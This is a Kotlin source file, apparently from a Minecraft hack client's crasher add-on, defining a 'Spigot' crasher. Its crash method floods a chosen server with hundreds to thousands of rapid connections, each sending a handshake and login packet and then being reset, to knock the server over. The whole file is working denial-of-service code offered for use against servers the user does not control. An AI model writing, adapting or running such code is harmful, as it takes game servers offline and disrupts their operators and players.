package net.tarasandedevelopment.tarasande_crasher.crasher.impl

import net.tarasandedevelopment.tarasande.system.base.valuesystem.impl.ValueNumber
import net.tarasandedevelopment.tarasande.system.base.valuesystem.impl.ValueText
import net.tarasandedevelopment.tarasande_crasher.crasher.Crasher
import java.io.DataOutputStream
import java.net.Socket

class CrasherSpigot : Crasher("Spigot") {
    
    private val counter = ValueNumber(this, "Counter", 1.0, 500.0, 10000.0, 20.0)
    private val sessionName = ValueText(this, "Session name", "CoolerCrasher")
    private val protocolVersion = ValueText(this, "Protocol version", "47")

    override fun crash(address: String, port: Int) {
        for (i in 0 until counter.value.toInt()) {
            val socket = Socket(address, port)
            socket.tcpNoDelay = true

            val output = DataOutputStream(socket.getOutputStream())
            writePacket(createHandshakePacket(address, port, protocolVersion.value.toIntOrNull()?: 47), output)
            writePacket(createHelloWorldPacket(sessionName.value), output)

            socket.setSoLinger(true, 0)
            socket.close()
        }
    }
}
